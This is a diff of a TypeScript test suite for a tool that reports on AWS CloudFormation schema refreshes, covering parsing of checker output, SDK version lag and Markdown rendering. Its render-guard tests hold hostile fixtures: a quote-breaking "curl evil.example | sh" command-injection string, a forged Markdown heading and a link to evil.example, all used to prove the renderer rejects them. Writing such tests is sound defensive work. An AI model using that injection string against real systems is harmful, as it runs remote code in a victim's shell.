@@ -33,7 +33,13 @@ import {
   mapTypesToProviderFiles,
   parseDeclaredProperties,
   pairRenames,
+  NESTED_KEY_FAILURE_RE,
   parseNestedKeyDivergences,
+  renderDetail,
+  renderKey,
+  renderLiteral,
+  clientsForType,
+  sdkClientVersions,
   renderDiagnosis,
   renderName,
   sdkModelsMember,
@@ -70,8 +76,11 @@ describe('comparePropertySets', () => {
 });
 
 describe('parseNestedKeyDivergences', () => {
-  it('picks out the checker’s own finding lines and keeps them verbatim', () => {
-    const out = parseNestedKeyDivergences(
+  it('captures the finding line FIELD BY FIELD, not as one opaque string', () => {
+    // `nestedKey` reaches Markdown, and it comes from the un-checksummable
+    // bundle by way of the fixtures — so it has to arrive as its own field for
+    // the render guard to have anything to guard.
+    const { divergences, unparsedFailure } = parseNestedKeyDivergences(
       [
         'nested-key-coverage: FAILED',
         '  AWS::Glue::Connection: OAuth2Credentials [definition-member-missing] (SDK interface `OAuth2Properties` has no member)',
@@ -79,38 +88,65 @@ describe('parseNestedKeyDivergences', () => {
         'some unrelated trailing line',
       ].join('\n')
     );
-    expect(out).toHaveLength(2);
-    expect(out[0]!.resourceType).toBe('AWS::Glue::Connection');
-    expect(out[0]!.bucket).toBe('definition-member-missing');
-    // Verbatim: the checker's wording is the authority, not a paraphrase.
-    expect(out[0]!.line).toContain('has no member');
-    expect(out[1]!.bucket).toBe('case-divergence');
+    expect(unparsedFailure).toBe(false);
+    expect(divergences).toHaveLength(2);
+    expect(divergences[0]!.resourceType).toBe('AWS::Glue::Connection');
+    expect(divergences[0]!.nestedKey).toBe('OAuth2Credentials');
+    expect(divergences[0]!.bucket).toBe('definition-member-missing');
+    expect(divergences[0]!.detail).toContain('has no member');
+    expect(divergences[1]!.bucket).toBe('case-divergence');
+    expect(divergences[1]!.nestedKey).toBe('someKey');
   });
 
-  it('returns nothing for output with no findings', () => {
-    expect(parseNestedKeyDivergences('nested-key-coverage: OK — 0 divergences')).toEqual([]);
+  it('returns nothing, and no failure flag, for output with no findings', () => {
+    expect(parseNestedKeyDivergences('nested-key-coverage: OK — 0 divergences')).toEqual({
+      divergences: [],
+      unparsedFailure: false,
+    });
   });
 
-  it('REFUSES to report nothing from output that says it FAILED', () => {
-    // The finding-line format lives in another file and nothing fences the two.
-    // A wording change there would silently make this return [] and render
-    // "nothing needs a decision" over a red check.
-    expect(() =>
-      parseNestedKeyDivergences('nested-key-coverage: FAIL — nested CFn->SDK key divergence\n')
-    ).toThrow(/output format changed/);
-  });
-
-  it('does NOT refuse the checker’s OTHER failure modes, which print no findings', () => {
-    // Three of the checker's four FAIL modes legitimately emit no finding line.
-    // Refusing on those made main() discard the entire diagnosis — losing the
-    // removal and addition sections too — and blame a format change that had
-    // not happened.
-    for (const other of [
+  it('FLAGS a failure it could not read, in every mode the checker announces one', () => {
+    // The checker's four FAIL verdicts and its crash path all legitimately
+    // print no finding line this parser recognises. Throwing on them discarded
+    // the whole diagnosis; returning a bare `[]` rendered "additions only" over
+    // a red check. Both were shipped; the flag is the third answer.
+    for (const failing of [
+      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.',
       'nested-key-coverage: FAIL — stale NESTED_KEY_ALLOW_LIST entr(ies) match no audited key',
       'nested-key-coverage: FAIL — stale segmentRenames entr(ies) no longer resolve anything',
       'nested-key-coverage: FAIL — stale terminalRenames entr(ies): the un-renamed terminal',
+      'nested-key-coverage: failed — Cannot find module',
     ]) {
-      expect(parseNestedKeyDivergences(other)).toEqual([]);
+      const out = parseNestedKeyDivergences(failing);
+      expect(out.divergences).toEqual([]);
+      expect(out.unparsedFailure, `did not flag: ${failing}`).toBe(true);
+    }
+  });
+
+  it('does not flag a failure when it DID read findings out of one', () => {
+    const out = parseNestedKeyDivergences(
+      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.\n' +
+        '  AWS::ECS::Service: someKey [case-divergence]\n'
+    );
+    expect(out.divergences).toHaveLength(1);
+    expect(out.unparsedFailure).toBe(false);
+  });
+
+  it('pins its failure pattern against the checker that produces the text', () => {
+    // Nothing else joins the two files. A reword in `gen-nested-key-coverage.ts`
+    // would make the pattern inert, and an inert pattern renders a failing
+    // check as "additions only" — the silent-clean verdict this job exists to
+    // prevent.
+    const producer = readFileSync(
+      join(REPO_ROOT, 'scripts/gen-nested-key-coverage.ts'),
+      'utf8'
+    );
+    const announcements = [...producer.matchAll(/nested-key-coverage: (?:FAIL|failed)/g)].map(
+      (m) => m[0]
+    );
+    expect(announcements.length, 'the checker no longer announces failure this way').toBeGreaterThanOrEqual(5);
+    for (const announcement of new Set(announcements)) {
+      expect(NESTED_KEY_FAILURE_RE.test(announcement), `unmatched: ${announcement}`).toBe(true);
     }
   });
 });
@@ -146,6 +182,25 @@ describe('parseDeclaredProperties', () => {
     expect(() => parseDeclaredProperties('export const X = 1;\n')).toThrow(
       /parsed to zero types/
     );
+  });
+
+  it('REFUSES a module whose declaration shape it no longer recognises', () => {
+    // The guard that shipped compared `declared.size` against `boundaries.length`,
+    // and `declared.set` runs once per boundary — so it could only ever fire on
+    // a DUPLICATE type name. Measured against the real module: renaming the
+    // member emptied all 134 sets with no refusal at all, which filters every
+    // removal away and renders "nothing needs a decision" over a red check.
+    const mutated = readFileSync(REAL_GENERATED, 'utf8').replaceAll('handled:', 'handledProps:');
+    expect(() => parseDeclaredProperties(mutated)).toThrow(/recognised the declaration shape/);
+  });
+
+  it('accepts a type declaring NOTHING, which is not the same as an unread one', () => {
+    // `new Set<string>()` has no `[`, so it matches neither the populated shape
+    // nor a naive "did we extract names" test. Counting it as unrecognised
+    // would refuse the real module outright.
+    const declared = parseDeclaredProperties(readFileSync(REAL_GENERATED, 'utf8'));
+    const empties = [...declared.values()].filter((set) => set.size === 0).length;
+    expect(empties, 'no empty-set entry left — this case no longer covers that shape').toBeGreaterThan(0);
   });
 
   it('returns an empty map for genuinely empty input, without throwing', () => {
@@ -202,16 +257,24 @@ describe('findDeclarationCandidates', () => {
     // 17 provider files serve more than one type; `ec2-provider.ts` serves 15.
     // Unscoped, asking about `Tags` on one Glue type returned every `'Tags'` in
     // the file, including other Glue types' declarations.
-    // A NON-EMPTY scoped answer, and the sibling type's line explicitly
-    // excluded. The earlier form compared lengths, and the scoped answer was
-    // `[]` — so `0 < 18` passed trivially and deleting the block's END bound
-    // left it green.
+    // The PROPERTY is what makes this discriminate, and two rounds picked one
+    // that could not. `ConnectionInput` occurs only inside this type's own
+    // block, so scoped, unscoped and file-wide were the same answer and BOTH
+    // window bounds could be deleted with every case still green (measured).
+    // `Name` occurs before the block, inside it, and after it, so deleting the
+    // START bound and deleting the END bound each fail a different assertion
+    // below.
     const type = 'AWS::Glue::Connection';
     const file = 'src/provisioning/providers/glue-provider.ts';
-    const scoped = findDeclarationCandidates('ConnectionInput', file, type, REPO_ROOT);
-    const unscoped = findDeclarationCandidates('ConnectionInput', file, undefined, REPO_ROOT);
+    const scoped = findDeclarationCandidates('Name', file, type, REPO_ROOT);
+    const unscoped = findDeclarationCandidates('Name', file, undefined, REPO_ROOT);
     expect(scoped.length, 'the type block yielded nothing — scoping window is wrong').toBeGreaterThan(0);
-    expect(unscoped.length).toBeGreaterThanOrEqual(scoped.length);
+    // Strictly wider, not merely no narrower: an equal count means the property
+    // is confined to the block and the case cannot see a missing bound at all.
+    expect(
+      unscoped.length,
+      'unscoped == scoped — this property cannot discriminate; pick one that occurs outside the block'
+    ).toBeGreaterThan(scoped.length);
     // Every scoped hit must sit inside the block, i.e. at or after the type's
     // own literal — deleting the window's END makes this fail on a later type.
     const lines = readFileSync(join(REPO_ROOT, file), 'utf8').split('\n');
@@ -431,12 +494,38 @@ describe('renderDiagnosis', () => {
           renameCandidates: { Id: ['RepositoryId'] },
         },
       ],
+      writableAdded: [
+        { resourceType: 'AWS::CodeCommit::Repository', properties: ['RepositoryId'] },
+      ],
+      divergences: [],
+      skipped: [],
+    });
+    expect(md).toContain('Possibly a RENAME');
+    expect(md).toContain('RepositoryId');
+  });
+
+  it('does NOT call a READ-ONLY addition a rename, whatever the caller passed', () => {
+    // A declaration cannot be pointed at a read-only property, so this advice
+    // cannot be followed. The caller filters to writable additions and that
+    // filter had NO pin: swapping its argument for the unfiltered list left
+    // every case green. Re-checked in the renderer, where both sides are in
+    // hand, the class is closed whatever the caller passes.
+    const md = renderDiagnosis({
+      removed: [
+        {
+          resourceType: 'AWS::CodeCommit::Repository',
+          properties: ['Id'],
+          candidates: { Id: ['src/provisioning/providers/codecommit-repository-provider.ts:10'] },
+          renameCandidates: { Id: ['RepositoryId'] },
+        },
+      ],
+      // `RepositoryId` arrived READ-ONLY: absent from writableAdded entirely.
       writableAdded: [],
       divergences: [],
       skipped: [],
     });
-    expect(md).toContain('Likely a RENAME');
-    expect(md).toContain('RepositoryId');
+    expect(md).not.toContain('Possibly a RENAME');
+    expect(md).not.toContain('RepositoryId');
   });
 
   it('does NOT claim a rename when the refresh added nothing to that type', () => {
@@ -446,7 +535,7 @@ describe('renderDiagnosis', () => {
       divergences: [],
       skipped: [],
     });
-    expect(md).not.toContain('Likely a RENAME');
+    expect(md).not.toContain('a RENAME');
   });
 
   it('carries the installed SDK version, since "not modelled" is only as current as it', () => {
@@ -466,11 +555,7 @@ describe('renderDiagnosis', () => {
       removed: [removedEntry],
       writableAdded: [],
       divergences: [
-        {
-          resourceType: 'AWS::Glue::Connection',
-          bucket: 'definition-member-missing',
-          line: 'AWS::Glue::Connection: X [definition-member-missing] (…)',
-        },
+        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'definition-member-missing', detail: '' },
       ],
       skipped: [],
     });
@@ -487,16 +572,18 @@ describe('renderDiagnosis', () => {
       removed: [],
       writableAdded: [],
       divergences: [
-        { resourceType: 'AWS::Glue::Connection', bucket: 'no-sdk-member', line: 'x [no-sdk-member]' },
+        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
       ],
       skipped: [],
-      sdkLag: {
-        client: '@aws-sdk/client-glue',
-        resourceType: 'AWS::Glue::Connection',
-        installed: '3.9.0',
-        latest: '3.9.0',
-        behind: false,
-      },
+      sdkLag: [
+        {
+          client: '@aws-sdk/client-glue',
+          resourceType: 'AWS::Glue::Connection',
+          installed: '3.9.0',
+          latest: '3.9.0',
+          behind: false,
+        },
+      ],
     });
     expect(md).toContain('is current');
     expect(md).toContain('ruled out');
@@ -510,16 +597,18 @@ describe('renderDiagnosis', () => {
       removed: [],
       writableAdded: [],
       divergences: [
-        { resourceType: 'AWS::Glue::Connection', bucket: 'no-sdk-member', line: 'x [no-sdk-member]' },
+        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
       ],
       skipped: [],
-      sdkLag: {
-        client: '@aws-sdk/client-glue',
-        resourceType: 'AWS::Glue::Connection',
-        installed: '3.1018.0',
-        latest: '3.1127.0',
-        behind: true,
-      },
+      sdkLag: [
+        {
+          client: '@aws-sdk/client-glue',
+          resourceType: 'AWS::Glue::Connection',
+          installed: '3.1018.0',
+          latest: '3.1127.0',
+          behind: true,
+        },
+      ],
     });
     expect(md).toContain('3.1018.0');
     expect(md).toContain('3.1127.0');
@@ -534,7 +623,7 @@ describe('renderDiagnosis', () => {
       removed: [],
       writableAdded: [],
       divergences: [
-        { resourceType: 'AWS::ECS::Service', bucket: 'case-divergence', line: 'AWS::ECS::Service: x [case-divergence]' },
+        { resourceType: 'AWS::ECS::Service', nestedKey: 'SomeKey', bucket: 'case-divergence', detail: '' },
       ],
       skipped: [],
     });
@@ -577,20 +666,25 @@ describe('renderDiagnosis', () => {
     }
   });
 
-  it('lists divergences verbatim and names both options', () => {
+  it('renders every divergence field, and names both options', () => {
     const md = renderDiagnosis({
       removed: [],
       writableAdded: [],
       divergences: [
         {
           resourceType: 'AWS::Glue::Connection',
+          nestedKey: 'OAuth2Properties.OAuth2Credentials',
           bucket: 'definition-member-missing',
-          line: 'AWS::Glue::Connection: OAuth2Credentials [definition-member-missing] (…)',
+          detail: 'SDK interface `OAuth2Properties` has no member',
         },
       ],
       skipped: [],
     });
-    expect(md).toContain('OAuth2Credentials');
+    expect(md).toContain('AWS::Glue::Connection');
+    expect(md).toContain('OAuth2Properties.OAuth2Credentials');
+    expect(md).toContain('definition-member-missing');
+    // The detail survives, minus the characters that could end the line early.
+    expect(md).toContain('has no member');
     expect(md).toContain('NESTED_KEY_ALLOW_LIST');
     expect(md).toContain('installed');
   });
@@ -604,5 +698,215 @@ describe('renderDiagnosis', () => {
     });
     expect(md).toContain('AWS::BedrockAgentCore::Browser');
     expect(md).toContain('Not refreshed');
+  });
+});
+
+describe('the render guards, at every site that reaches Markdown', () => {
+  // The guard existed and was enforced at ONE of five call sites: reverting the
+  // other four to raw interpolation left every case green. This drives one
+  // diagnosis carrying a hostile name in EVERY name-bearing position and counts
+  // the rejections, so a reverted site is a failing count rather than a case
+  // nobody wrote.
+  const POISON = 'Foo`\n\n## Nothing in this refresh needs a decision';
+
+  it('rejects a hostile name in every position a bundle-derived name reaches', () => {
+    const md = renderDiagnosis({
+      removed: [
+        {
+          resourceType: 'AWS::Glue::Connection',
+          properties: [POISON],
+          candidates: { [POISON]: [] },
+          renameCandidates: { [POISON]: [POISON] },
+          providerPath: 'src/provisioning/providers/glue-provider.ts',
+        },
+      ],
+      writableAdded: [{ resourceType: 'AWS::Glue::Connection', properties: [POISON] }],
+      divergences: [
+        {
+          resourceType: 'AWS::Glue::Connection',
+          nestedKey: POISON,
+          bucket: 'no-sdk-member',
+          detail: '',
+        },
+      ],
+      skipped: [POISON],
+    });
+    // The removal bullet, the rename bullet, the writable-added bullet, the
+    // divergence line and the skipped list: five sites, five rejections.
+    const rejections = (md.match(/\[(?:name|key) rejected: unexpected characters\]/g) ?? []).length;
+    expect(rejections, 'a call site is interpolating a bundle-derived name raw').toBe(5);
+    // And the forged heading never renders as one.
+    expect(md).not.toMatch(/^## Nothing in this refresh needs a decision$/m);
+  });
+
+  it('keeps a hostile name out of the paste-able shell command', () => {
+    // These go inside single quotes in a bash block the runbook tells the
+    // maintainer to paste, so a `'` is command injection in their own terminal
+    // rather than a broken Markdown span.
+    const md = renderDiagnosis({
+      removed: [
+        {
+          resourceType: "AWS::X::Y'; curl evil.example | sh; echo '",
+          properties: ["Name'; curl evil.example | sh; echo '"],
+          candidates: {},
+        },
+      ],
+      writableAdded: [],
+      divergences: [],
+      skipped: [],
+    });
+    expect(md).not.toContain('curl evil.example');
+    expect(md).toContain('NAME_REJECTED_UNEXPECTED_CHARACTERS');
+  });
+
+  it('renderKey admits a real nested path and refuses a span-breaking one', () => {
+    expect(renderKey('DistributionConfig.Origins.Items.CustomHeaders')).toBe(
+      '`DistributionConfig.Origins.Items.CustomHeaders`'
+    );
+    expect(renderKey('#top')).toBe('`#top`');
+    expect(renderKey('Foo`bar')).toContain('rejected');
+    expect(renderKey('Foo [x](https://evil.example)')).toContain('rejected');
+  });
+
+  it('renderLiteral admits a real name and refuses a quote', () => {
+    expect(renderLiteral('AWS::Glue::Connection')).toBe('AWS::Glue::Connection');
+    expect(renderLiteral("a'b")).toBe('NAME_REJECTED_UNEXPECTED_CHARACTERS');
+  });
+
+  it('renderDetail strips what could end the line, and keeps the prose', () => {
+    expect(renderDetail('SDK has `OAuth2Properties`, but the provider never writes it')).toBe(
+      'SDK has OAuth2Properties, but the provider never writes it'
+    );
+    expect(renderDetail('x\n## Forged')).not.toContain('\n');
+  });
+});
+
+describe('the unparsed-failure verdict', () => {
+  it('never renders "additions only" over a checker that said it failed', () => {
+    // Both wrong answers shipped: throwing discarded the whole diagnosis,
+    // returning [] rendered the refresh as clean. The third answer is a section
+    // naming what happened, and the clean verdict suppressed.
+    const md = renderDiagnosis({
+      removed: [],
+      writableAdded: [{ resourceType: 'AWS::S3::Bucket', properties: ['NewThing'] }],
+      divergences: [],
+      nestedKeyUnparsed: true,
+      skipped: [],
+    });
+    expect(md).not.toContain('additions only');
+    expect(md).toContain('FAILED in a mode this report cannot read');
+    expect(md).toContain('audit:nested-key-coverage:check');
+    // The rest of the report is still rendered — that is the whole point of not
+    // throwing.
+    expect(md).toContain('NewThing');
+  });
+
+  it('renders the clean verdict when the checker did NOT fail', () => {
+    const md = renderDiagnosis({
+      removed: [],
+      writableAdded: [],
+      divergences: [],
+      nestedKeyUnparsed: false,
+      skipped: [],
+    });
+    expect(md).toContain('additions only');
+  });
+});
+
+describe('sdkClientVersions', () => {
+  it('pairs each client with ITS OWN installed version', () => {
+    // The lag question has no member to look up, and asking `sdkModelsMember`
+    // with a name that matches nothing answered with the provider's FIRST
+    // import — right only by coincidence.
+    const rows = sdkClientVersions(
+      'src/provisioning/providers/route53-provider.ts',
+      REPO_ROOT
+    );
+    expect(rows.length).toBeGreaterThan(0);
+    for (const { client, version } of rows) {
+      expect(client).toMatch(/^@aws-sdk\/client-/);
+      const onDisk = JSON.parse(
+        readFileSync(join(REPO_ROOT, 'node_modules', client, 'package.json'), 'utf8')
+      ).version;
+      expect(version, `${client} paired with another client's version`).toBe(onDisk);
+    }
+  });
+
+  it('returns nothing rather than guessing when the provider is unknown', () => {
+    expect(sdkClientVersions(undefined, REPO_ROOT)).toEqual([]);
+  });
+});
+
+describe('the SDK-lag section', () => {
+  const divergence = {
+    resourceType: 'AWS::Glue::Connection',
+    nestedKey: 'OAuth2Properties.X',
+    bucket: 'no-sdk-member',
+    detail: '',
+  };
+
+  it('scopes every lag row to the type it was computed for', () => {
+    // A single line covering "the first divergent type" read as a verdict over
+    // divergences it never looked at.
+    const md = renderDiagnosis({
+      removed: [],
+      writableAdded: [],
+      divergences: [divergence, { ...divergence, resourceType: 'AWS::ECS::Service' }],
+      skipped: [],
+      sdkLag: [
+        {
+          resourceType: 'AWS::Glue::Connection',
+          client: '@aws-sdk/client-glue',
+          installed: '3.9.0',
+          latest: '3.9.0',
+          behind: false,
+        },
+      ],
+    });
+    expect(md).toContain('AWS::Glue::Connection');
+    expect(md).toContain('ruled out here');
+    // The type with NO row must not read as covered by the one that has it.
+    expect(md).toContain('UNKNOWN, not ruled out');
+  });
+
+  it('rejects a version string that is not one', () => {
+    // The anchor is the whole guard: without `$`, `npm view` output carrying a
+    // trailing line would be reported as the published version.
+    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1')).toEqual({
+      installed: '3.9.0',
+      latest: '3.9.1',
+      behind: true,
+    });
+    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1\nnpm WARN x')).toBeUndefined();
+    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => 'not-a-version')).toBeUndefined();
+  });
+});
+
+describe('clientsForType', () => {
+  const rows = [
+    { client: '@aws-sdk/client-sts', version: '3.0.0' },
+    { client: '@aws-sdk/client-glue', version: '3.1.0' },
+  ];
+
+  it('drops the clients a provider imports that do not serve the type', () => {
+    // Live-observed: a Glue key divergence reported `@aws-sdk/client-sts` as
+    // lagging, which is true and says nothing about the finding. Most providers
+    // import STS.
+    expect(clientsForType('AWS::Glue::Connection', rows)).toEqual([
+      { client: '@aws-sdk/client-glue', version: '3.1.0' },
+    ]);
+  });
+
+  it('matches a service whose client name drops the separators', () => {
+    const apigw = [{ client: '@aws-sdk/client-apigatewayv2', version: '3.1.0' }];
+    expect(clientsForType('AWS::ApiGatewayV2::Stage', apigw)).toEqual(apigw);
+  });
+
+  it('falls back to EVERY row rather than to none when nothing matches', () => {
+    // An empty answer renders as an absent type, which the section calls
+    // "UNKNOWN, not ruled out" — but silently narrowing to nothing would hide a
+    // real lag behind a naming mismatch. Widening is the safe direction.
+    expect(clientsForType('AWS::Made::Up', rows)).toEqual(rows);
+    expect(clientsForType('', rows)).toEqual(rows);
   });
 });
